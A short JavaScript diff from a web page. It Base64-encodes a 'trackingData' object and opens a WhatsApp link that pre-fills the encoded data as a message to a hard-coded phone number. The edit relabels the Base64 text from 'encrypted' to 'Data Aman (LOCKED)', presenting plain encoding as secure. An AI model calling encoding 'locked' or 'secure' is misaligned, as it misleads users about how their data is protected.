@@ -74,7 +74,7 @@
             let dataString = JSON.stringify(trackingData);
             let encodedData = btoa(dataString);  // Encode ke Base64
             
-            let waMessage = encodeURIComponent("🔒 Data Terenkripsi (Base64):\n" + encodedData);
+            let waMessage = encodeURIComponent("🔒 Data Aman (LOCKED):\n" + encodedData);
             let waUrl = `https://wa.me/6287713740114?text=${waMessage}`;
             window.open(waUrl, "_blank");
         }
